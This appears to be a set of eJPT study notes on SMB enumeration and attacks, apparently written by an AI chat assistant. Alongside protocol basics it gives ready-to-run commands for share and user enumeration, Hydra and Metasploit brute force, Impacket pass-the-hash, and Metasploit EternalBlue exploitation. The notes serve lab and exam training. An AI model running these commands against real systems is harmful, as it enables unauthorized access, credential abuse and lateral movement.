

# 🗂️ SMB Enumeration & Attacks — FULL DETAILED NOTES (EN)

---

## 1. What is SMB?

**SMB (Server Message Block)** is a **network file-sharing protocol** used mainly in **Windows environments** for:

- File sharing
    
- Printer sharing
    
- Inter-process communication
    
- Authentication
    

### Common Implementations:

- **SMBv1** (legacy, insecure)
    
- **SMBv2 / SMBv3** (modern, more secure)
    

---

## 2. SMB Ports & Services

|Port|Service|
|---|---|
|445/TCP|SMB over TCP|
|139/TCP|SMB over NetBIOS|
|137/UDP|NetBIOS Name Service|
|138/UDP|NetBIOS Datagram|

📌 If port **445** is open → SMB is active  
📌 Port **139** usually indicates **legacy SMB**

---

## 3. SMB Authentication (NTLM Flow)

### Step-by-step Authentication:

1. Client sends authentication request
    
2. Server sends random challenge
    
3. Client encrypts challenge using **NTLM hash**
    
4. Encrypted response sent back
    
5. Server verifies using:
    
    - Active Directory (Domain)
        
    - SAM database (Local)
        

📌 Password is **never sent**, only the hash response

---

## 4. SMB Weak Points (Core Attacks)

### 1️⃣ Pass-the-Hash (PtH)

- Use NTLM hash **instead of password**
    
- No cracking required
    

**Tools:**

- Mimikatz
    
- Metasploit
    
- Impacket
    

---

### 2️⃣ SMB Relay Attack

- Capture NTLM authentication
    
- Relay it to another SMB service
    
- Gain access without cracking
    

**Tools:**

- Responder
    
- Impacket
    

---

### 3️⃣ EternalBlue (MS17-010)

- Exploit SMBv1 vulnerability
    
- Remote Code Execution
    
- Used by **WannaCry**
    

📌 Target must have:

- SMBv1 enabled
    
- Unpatched Windows
    

---

## 5. SMB Enumeration with Nmap

```bash
nmap -p 445 --script smb-os-discovery <target>
```

Reveals:

- OS version
    
- Hostname
    
- Domain / Workgroup
    

---

```bash
nmap -p 445 --script smb-enum-shares <target>
```

Reveals:

- Shared folders
    
- Permissions
    

---

```bash
nmap -p 445 --script smb-enum-users <target>
```

Reveals:

- Valid usernames (if allowed)
    

---

## 6. SMB Enumeration with smbclient

### List shares (Anonymous)

```bash
smbclient -L //<target> -N
```

- `-N` → no password
    

---

### Connect to a share

```bash
smbclient //<target>/share -N
```

---

### Common smbclient commands

```bash
ls
get file.txt
put file.txt
```

---

## 7. SMB Enumeration with enum4linux

```bash
enum4linux <target>
```

Collects:

- Users
    
- Groups
    
- Shares
    
- OS info
    
- Password policy
    

📌 Very common in eJPT labs

---

## 8. SMB Brute Force Attacks

### Using Hydra

```bash
hydra -L users.txt -P passwords.txt smb://<target>
```

---

### Using Metasploit

```bash
use auxiliary/scanner/smb/smb_login
set RHOSTS <target>
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

---

## 9. Pass-the-Hash (Practical)

### Using Impacket

```bash
psexec.py <user>@<target> -hashes <LM>:<NT>
```

Example:

```bash
psexec.py Administrator@192.168.1.10 -hashes aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99
```

---

## 10. SMB Relay (Conceptual Flow)

1. Victim authenticates via SMB
    
2. Attacker captures NTLM challenge
    
3. Attacker relays authentication to another host
    
4. Access granted as victim user
    

📌 No password cracking involved

---

## 11. EternalBlue Exploitation (Lab Style)

### Step 1: Scan for vulnerability

```bash
nmap -p 445 --script smb-vuln-ms17-010 <target>
```

---

### Step 2: Exploit using Metasploit

```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target>
set LHOST <your_ip>
run
```

---

### Result:

- Meterpreter session
    
- SYSTEM privileges (often)
    

---

## 12. SMB → Lateral Movement

SMB is often used for:

- Credential reuse
    
- Pivoting
    
- Domain compromise
    

Typical chain:

```
SMB Enum → Credentials → Pass-the-Hash → Lateral Movement
```

---

## SMB — Exam Notes (eJPT)

- Always enumerate SMB
    
- Try anonymous access first
    
- enum4linux is mandatory
    
- SMBv1 = high risk
    
- PtH appears frequently in labs
    

---

## SMB Summary

SMB is:

- One of the biggest Windows attack surfaces
    
- A gateway to lateral movement
    
- Central in internal penetration tests
    

---

🔥 **Next topics (EN, same depth):**

- FTP Attacks
    
- IIS Exploitation
    
- Apache Tomcat
    
- RDP
    
- WinRM
    
- Pivoting & Lateral Movement
    

Say **next** and I continue immediately 🚀